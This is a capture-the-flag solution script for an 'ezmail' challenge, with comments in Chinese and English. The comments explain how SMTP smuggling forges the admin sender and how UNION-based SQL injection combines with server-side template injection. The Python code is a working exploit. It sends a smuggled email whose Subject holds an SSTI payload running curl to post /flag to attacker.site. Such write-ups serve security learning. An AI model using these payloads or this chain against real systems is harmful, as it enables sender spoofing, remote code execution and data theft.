# 主要考点是SMTP Smuggling
# 注意到`/admin`下使用`render_template_string()`拼接渲染，可构造SSTI。
# 其中的可控部分源自本地邮箱里的来自`admin@ezmail.org`的邮件中的Subject里的url指向的本地页面内容。
# 虽然`/report`下能发送邮件，但是固定发送者为`ignored@ezmail.org`。
# 仔细阅读`/report`下的代码发现，邮件发送也经过拼接
# (为了方便构造出题的时候特意魔改了`smtplib._quote_periods`)
# 可以构造SMTP Smuggling，伪造发信人为`admin@ezmail.org` 。
# 同时注意到`news`页面存在SQLI。考虑将SSTI Payload用UNION的方式塞到页面里再由`/admin` 读取即可。

# The main focus is on SMTP Smuggling.
# It is noticed that the render_template_string() method is used to concatenate and render under /admin, which could allow for SSTI (Server-Side Template Injection).
# The controllable part comes from the email in the local inbox from admin@ezmail.org, where the URL in the Subject points to a local page's content.
# Although emails can be sent from /report, the sender is fixed as ignored@ezmail.org.
# Upon carefully reviewing the code under /report, it is found that email sending also involves concatenation.
# (To make it easier to construct the question, I specifically modified smtplib._quote_periods.)
# SMTP Smuggling can be constructed to forge the sender as admin@ezmail.org.
# Additionally, it is observed that the news page is vulnerable to SQL Injection (SQLi).
# Consider injecting the SSTI Payload via UNION into the page, which can then be read by /admin.

import requests

cookies = {
    'connect.sid': 'XXX',
}

headers = {
    'Host': 'ezmail.org:3000',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'close'
}

content = """FAKE CONTENT\r\n""" + "\n.\n" + """\r\nmail FROM:<admin@ezmail.org>\r\nrcpt TO:<admin@ezmail.org>\r\ndata\r\nFrom: admin@ezmail.org\r\nTo: admin@ezmail.org\r\nSubject: http://ezmail.org:3000/news?id=5 union select (select '{{request.application.__globals__.__builtins__.__import__("os").popen("curl http://attacker.site -d @/flag").read()}}') --\r\n\r\nSMUGGLING"""
data = f'url=123&content={content}'

response = requests.post('http://XXX.XXX.XXX.XXX:XXXX/report', cookies=cookies, headers=headers, data=data, verify=False)
requests.get('http://XXX.XXX.XXX.XXX:XXXX/bot')